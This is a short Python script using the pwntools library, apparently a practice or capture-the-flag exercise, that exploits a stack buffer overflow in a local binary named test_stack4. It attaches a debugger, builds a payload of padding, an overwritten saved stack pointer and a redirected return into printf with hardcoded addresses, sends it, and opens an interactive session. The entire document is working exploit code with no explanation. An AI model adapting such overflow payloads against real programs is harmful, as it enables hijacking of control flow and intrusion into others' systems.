from pwn import *
p = process("./test_stack4")
gdb.attach("test_stack4")
yw = 0x080484f6
printf =0x08048320
strloc = 0x08048000+0x5bc 
#yw = "\xf3\x84\x04\x08"
pad = "AAAABBBBCCCCDDDDEEEE"
#prevsp = 0xffffd090
prevsp = 0xffa2b880
exploit = pad + p32(prevsp)+"A"*24 + p32(printf) + "A"*4 + p32(strloc)
#exploit = "AAAA"
p.sendline(exploit)
#print exploit
p.interactive()
